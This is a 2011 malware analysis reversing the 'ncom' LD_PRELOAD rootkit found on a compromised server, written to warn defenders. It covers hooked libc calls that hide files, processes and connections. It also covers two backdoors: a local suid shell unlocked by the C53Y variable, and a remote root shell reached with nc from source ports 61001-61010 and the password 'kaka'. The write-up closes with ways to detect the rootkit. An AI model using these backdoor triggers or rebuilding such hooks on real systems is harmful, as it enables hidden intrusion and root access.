@@ -1,0 +1,343 @@
+An analisys of the "ncom" Rootkit
+=================================
+
+Author
+------
+
+This research was made by Alessandro Grassi (Sonne), in March 21-23 2011. 
+
+If you want to contact me, you can do so 
+
+- by email: <alessandro@aggro.it> / <alessandro.grassi@devise.it> 
+- or on IRC: Sonne @ #plug-it, FreeNode
+
+Introduction
+------------
+indexterm:[Second example index entry]
+
+The rootkit being examined here is codenamed "ncom". It was found "in the wild" on a rooted box. It makes use of a technique called "libcall hijacking".
+
+While the technique was already known, there was no proof that it was being used for malicious purposes - this is, to my knowledge, the first rootkit to make use of such technique.
+
+It all started when my colleague mnencia pointed me to this bug report:
+
+http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=619137
+
+A certain library called "libncom.so.4.0.1" was causing random crashes in dovecot.
+
+Having smelled something funny, i contacted the bug reporter via IRC, asking to see personally what was going on.
+
+Pekka was very kind and gave me access to his system, so i managed to find out that the box was rooted and kitted.
+
+Since the rootkit is using a new technique, we thought i'd analyze it and publish the results, so others could be warned of the risk.
+
+
+Libcall hijacking / Wait, what?
+-------------------------------
+
+I'm not going to explain in depth how libcall hijacking works, because it's beyond the scope of this document.
+
+I will however throw a quick introduction:
+
+When a program calls a function which is not included in its source, it's looked up in the libraries linked to that program during compilation.
+
+The easiest example that comes to mind is printf: The classic "hello world" program references printf(), however the function is not implemented in the program itself.
+
+During the compiling process, in the linking phase, the hello world program is linked to the libc (typically libc.so.6), so when it calls the printf() function on runtime the function is looked up in the linked libraries and called, making the program work.
+
+You have the possibility, however, to make the system load a certain library before the others by preloading it, making the program call the functions that the preloaded library implements rather than the ones it's supposed to be referencing.
+
+This way it is possible to alter the program execution flow, by making library calls behave differently from what the program expects.
+
+Preloading is possible both locally (LD_PRELOAD environment variable) and globally (/etc/ld.so.preload).
+
+The ncom rootkit works by placing itself on /etc/ld.so.preload, and wrapping library calls such as those normally used for listing processes or files, altering their result.
+
+Now that we know the idea behind the technique, let's see what this nasty fella does:
+
+
+Rootkit Analysis
+----------------
+
+What is wrapped?
+~~~~~~~~~~~~~~~~
+
+By taking a quick glance at the rootkit, we find that the following functions are implemented (functions present in the libc are *highlighted*):
+
+- __xstat64-0xd0
+- *__xstat64*
+- *__xstat*
+- *fopen64*
+- *fopen*
+- *readdir64*
+- *readdir*
+- *accept*
+- my_accept
+- drop_dupshell
+- drop_suidshell
+- drop_suidshell_if_env_is_set
+- sigchld_handler
+- is_readdir_result_invisible
+- is_readdir64_result_invisible
+- my_netstat
+- is_proc_net_tcp
+- is_ld_so_preload
+- is_invisible
+- is_file_invisible
+- shall_stat_return_error
+
+The libc-like named functions make it so that all programs in the system run them instead of the original ones.
+
+A few of them serve the purpose of merely hiding things, others have way more nefarious intents, as we are about to see.
+
+What is hidden?
+~~~~~~~~~~~~~~~
+
+The most basic syscall or libcall you'd be hijacking if you were to hide something is readdir, as it works for both files and processes (assuming that process listers use the /proc interface).
+
+Let's take a look at this snippet from the rootkit's readdir() implementation:
+
+--------------------------------------
+0x000000000000185c <readdir+60>:	mov    %rbp,%rdi
+0x000000000000185f <readdir+63>:	callq  0x1220 <is_readdir_result_invisible@plt>
+0x0000000000001864 <readdir+68>:	test   %eax,%eax
+0x0000000000001866 <readdir+70>:	jne    0x1830 <readdir+16>
+0x0000000000001868 <readdir+72>:	add    $0x8,%rsp
+0x000000000000186c <readdir+76>:	mov    %rbp,%rax
+0x000000000000186f <readdir+79>:	pop    %rbx
+0x0000000000001870 <readdir+80>:	pop    %rbp
+0x0000000000001871 <readdir+81>:	retq   
+--------------------------------------
+
+Once a process is found, the rootkit uses the internal function is_readdir_result_invisible() to find out whether to hide the data or not, which is basically a wrapper for the more generic is_invisible().
+
+Let's take a look at it:
+
+--------------------------------------
+0x0000000000002048 <is_invisible+360>:	lea    0x1bd(%rip),%rsi        # 0x220c - string "_-"
+0x000000000000204f <is_invisible+367>:	mov    %rsp,%rdi
+0x0000000000002052 <is_invisible+370>:	callq  0x1300 <strstr@plt>
+0x0000000000002057 <is_invisible+375>:	test   %rax,%rax
+0x000000000000205a <is_invisible+378>:	setne  %al
+0x000000000000205d <is_invisible+381>:	movzbl %al,%eax
+0x0000000000002060 <is_invisible+384>:	jmpq   0x1f36 <is_invisible+86>
+[..]
+0x0000000000001f1e <is_invisible+62>:	lea    0x2ea(%rip),%rdi        # 0x220f - string "libncom.so.4.0.1"
+0x0000000000001f25 <is_invisible+69>:	mov    $0x11,%ecx
+0x0000000000001f2a <is_invisible+74>:	mov    %rdx,%rsi
+0x0000000000001f2d <is_invisible+77>:	repz cmpsb %es:(%rdi),%ds:(%rsi)
+0x0000000000001f2f <is_invisible+79>:	jne    0x1f60 <is_invisible+128>
+[..]
+0x0000000000001f36 <is_invisible+86>:	mov    0x3090(%rsp),%rbx
+0x0000000000001f3e <is_invisible+94>:	mov    0x3098(%rsp),%rbp
+0x0000000000001f46 <is_invisible+102>:	mov    0x30a0(%rsp),%r12
+0x0000000000001f4e <is_invisible+110>:	add    $0x30a8,%rsp
+0x0000000000001f55 <is_invisible+117>:	retq   
+--------------------------------------
+
+The string "_-", as well as the name of the rootkit library itself, are checked against the file name or the content of /proc/[filename]/cmdline and if found, the function returns without reporting the entry, thus hiding it from the file (or directory) list.
+
+This can be verified on the backdoored system:
+
+The file is hidden: 
+
+--------------------------------------
+root@aria:~# ls -l
+total 0
+root@aria:~# ln -s /bin/cat _-
+root@aria:~# ls -l
+total 0
+root@aria:~# ls -l _-
+lrwxrwxrwx 1 root root 8 Mar 23 22:47 _- -> /bin/cat
+root@aria:~# 
+--------------------------------------
+
+And so is the process:
+
+--------------------------------------
+root@aria:~# ./_-
+^Z
+[1]+  Stopped                 ./_-
+root@aria:~# ps
+  PID TTY          TIME CMD
+ 2636 pts/0    00:00:00 bash
+ 2768 pts/0    00:00:00 ps
+root@aria:~# 
+--------------------------------------
+
+Another interesting function that is being wrapped is fopen().
+
+--------------------------------------
+0x0000000000001793 <fopen+99>:	callq  0x1260 <is_proc_net_tcp@plt>
+0x0000000000001798 <fopen+104>:	test   %eax,%eax
+0x000000000000179a <fopen+106>:	je     0x1770 <fopen+64>
+0x000000000000179c <fopen+108>:	mov    (%rsp),%rbx
+0x00000000000017a0 <fopen+112>:	mov    0x8(%rsp),%rbp
+0x00000000000017a5 <fopen+117>:	xor    %eax,%eax
+0x00000000000017a7 <fopen+119>:	mov    0x10(%rsp),%r12
+0x00000000000017ac <fopen+124>:	add    $0x18,%rsp
+0x00000000000017b0 <fopen+128>:	jmpq   0x12f0 <my_netstat@plt>
+--------------------------------------
+
+The backdoored fopen() checks whether the file being opened is /proc/net/tcp, in which case, the internal function my_netstat is called, which makes a copy of /proc/net/tcp and strips the lines that are to be hidden from it before passing the descriptor to the calling program, thus hiding the attacker's connections as well.
+
+
+Last but not least, the xstat() wrapper has two main functions. One of which is hiding the rootkit itself:
+
+--------------------------------------
+0x00000000000015ca <__xstat64+106>:	callq  0x1270 <shall_stat_return_error@plt>
+0x00000000000015cf <__xstat64+111>:	test   %eax,%eax
+0x00000000000015d1 <__xstat64+113>:	jne    0x159c <__xstat64+60>
+[..]
+0x000000000000159c <__xstat64+60>:	mov    $0xffffffff,%eax
+0x00000000000015a1 <__xstat64+65>:	mov    0x8(%rsp),%rbx
+0x00000000000015a6 <__xstat64+70>:	mov    0x10(%rsp),%rbp
+0x00000000000015ab <__xstat64+75>:	mov    0x18(%rsp),%r12
+0x00000000000015b0 <__xstat64+80>:	mov    0x20(%rsp),%r13
+0x00000000000015b5 <__xstat64+85>:	add    $0x28,%rsp
+0x00000000000015b9 <__xstat64+89>:	retq   
+
+0x00000000000020f3 <shall_stat_return_error+51>:	callq  0x1430 <is_ld_so_preload@plt>
+0x00000000000020f8 <shall_stat_return_error+56>:	test   %eax,%eax
+0x00000000000020fa <shall_stat_return_error+58>:	je     0x20ce <shall_stat_return_error+14>
+[..]
+0x00000000000020ce <shall_stat_return_error+14>:	xor    %eax,%eax
+0x00000000000020d0 <shall_stat_return_error+16>:	pop    %rbx
+0x00000000000020d1 <shall_stat_return_error+17>:	retq   
+--------------------------------------
+
+So if the file being stat()ed is /etc/ld.so.preload, the library returns an error, thus hiding the presence of the rootkit:
+
+--------------------------------------
+root@aria:~# ls -l /etc/ld.so.prel*  
+ls: cannot access /etc/ld.so.prel*: No such file or directory
+root@aria:~# cat /etc/ld.so.preload
+/lib/libncom.so.4.0.1
+--------------------------------------
+
+Did i just say that the xstat() wrapper has two functions? It's time to get to the next part...
+
+
+The Backdoor
+~~~~~~~~~~~~
+
+Every rootkit worth its name does at least two things: hides the attacker, and grants him access. This one is no less.
+It has two backdoors. The local backdoor is in the xstat() wrapper:
+
+--------------------------------------
+0x00000000000015c2 <__xstat64+98>:	callq  0x1440 <drop_suidshell_if_env_is_set@plt>
+
+0x0000000000001b30 <drop_suidshell_if_env_is_set+0>:	lea    0x6aa(%rip),%rdi        # 0x21e1 - string 'C53Y'
+0x0000000000001b37 <drop_suidshell_if_env_is_set+7>:	sub    $0x8,%rsp
+0x0000000000001b3b <drop_suidshell_if_env_is_set+11>:	callq  0x1370 <getenv@plt>
+0x0000000000001b40 <drop_suidshell_if_env_is_set+16>:	test   %rax,%rax
+0x0000000000001b43 <drop_suidshell_if_env_is_set+19>:	je     0x1b52 <drop_suidshell_if_env_is_set+34>
+0x0000000000001b45 <drop_suidshell_if_env_is_set+21>:	callq  0x1290 <geteuid@plt>
+0x0000000000001b4a <drop_suidshell_if_env_is_set+26>:	test   %eax,%eax
+0x0000000000001b4c <drop_suidshell_if_env_is_set+28>:	nopl   0x0(%rax)
+0x0000000000001b50 <drop_suidshell_if_env_is_set+32>:	je     0x1b60 <drop_suidshell_if_env_is_set+48>
+0x0000000000001b52 <drop_suidshell_if_env_is_set+34>:	add    $0x8,%rsp
+0x0000000000001b56 <drop_suidshell_if_env_is_set+38>:	retq   
+0x0000000000001b57 <drop_suidshell_if_env_is_set+39>:	nopw   0x0(%rax,%rax,1)
+0x0000000000001b60 <drop_suidshell_if_env_is_set+48>:	add    $0x8,%rsp
+0x0000000000001b64 <drop_suidshell_if_env_is_set+52>:	jmpq   0x1390 <drop_suidshell@plt>
+--------------------------------------
+
+What this means is:
+Any program throwing a xstat() during its life cycle checks whether the C53Y environment variable is set and if it is, if the program is suid root (geteuid() returns 0), drops a suidshell.
+
+--------------------------------------
+sonne@aria:~$ su
+Password: 
+su: Authentication failure
+sonne@aria:~$ C53Y=foo su
+root@aria:~# 
+--------------------------------------
+
+The other backdoor is in the accept() wrapper.
+
+--------------------------------------
+0x00000000000018b6 <accept+54>:	callq  *%rax		# stored address for libc accept()
+[..]
+0x00000000000018cf <accept+79>:	jmpq   0x13c0 <my_accept@plt>
+
+0x00000000000018f2 <my_accept+18>:	movzwl 0x2(%rsi),%eax
+0x00000000000018f6 <my_accept+22>:	ror    $0x8,%ax
+0x00000000000018fa <my_accept+26>:	add    $0x11b8,%ax
+0x00000000000018fe <my_accept+30>:	cmp    $0xa,%ax
+0x0000000000001902 <my_accept+34>:	jbe    0x191d <my_accept+61>
+[..]
+0x000000000000191d <my_accept+61>:	nopl   (%rax)
+0x0000000000001920 <my_accept+64>:	callq  0x12e0 <drop_dupshell@plt>
+--------------------------------------
+
+For every incoming connection on any port, the source port is checked. If it is in the 61001 - 61010 range, the connection is taken over by the rootkit.
+Upon taking over, the rootkit asks for a password ("kaka", in this specific case), and then drops a root shell:
+
+--------------------------------------
+sonne@defiance:~$ nc 192.168.1.124 22
+SSH-2.0-OpenSSH_5.5p1 Debian-6
+^C
+sonne@defiance:~$ nc -p 61002 192.168.1.124 22
+!
+a
+sonne@defiance:~$ nc -p 61001 192.168.1.124 22
+!
+kaka
+bash -i;
+bash: no job control in this shell
+root@aria:/# 
+--------------------------------------
+
+This way of backdooring is very smart, because any open port can be used to access the rootkit. 
+
+Unlike other notable examples (such as suckit), a firewall wouldn't deny the attacker access to the rooted box.
+
+_(Thanks to mnencia for having helped me reversing this part)_
+
+Detection
+---------
+
+This rootkit can be hard to detect, as it requires the attacker to be doing something on the system at the very moment you're checking in order to be detected by normal means (see: unhide, rkhunter, chkrootkit, etc)
+
+If a process is running and being hidden, however, unhide detects it perfectly.
+
+Short of efficiency from the forementioned automated tools at our disposal, there are a couple ways to determine if you have a rootkit of this nature on your system.
+
+One method is that of running "cat /etc/ld.so.preload", which would work even though the file is hidden, due to the rootkit's creator laziness in properly wrapping fopen(). This might not work with more properly written rootkits.
+
+The other method is to get yourself a statically compiled version of the "find" program, launch both the static and dynamic binaries and compare the two outputs.
+
+--------------------------------------
+root@aria:~# find / > /tmp/lib.out
+root@aria:~# find-static / > /tmp/static.out 
+root@aria:~# diff /tmp/lib.out /tmp/static.out |grep -v /proc
+7315a7316
+> /lib/libncom.so.4.0.1
+10545a10547
+> /etc/ld.so.preload
+20373a20376,20522
+20704,20862c20853,21011
+---
+54890a55040
+> /root/_-
+54900a55051
+> /root/libncom.so.4.0.1
+root@aria:~# 
+--------------------------------------
+
+This works because static binaries have all the needed libraries built in, and don't need to access them in order to call the library functions. For this reason, they're immune to the rootkit's attack vector.
+
+
+Thanks and credits
+------------------
+
+My thanks go to, in order of appearance:
+
+* Marco Nenciarini (mnencia) for pointing me to the dovecot bug report, and for being my life's greatest inspiration.
+* Pekka Takala (Pihti) for being so friendly and kind to let me access his box and lending me a hand with the initial detection.
+* All the SmashTheStack.org network for being my training grounds. 
+** Big thanks go specially to s0ttle for having created the apfel wargame, where i learned everything i know about reverse engineering.
+
+
+
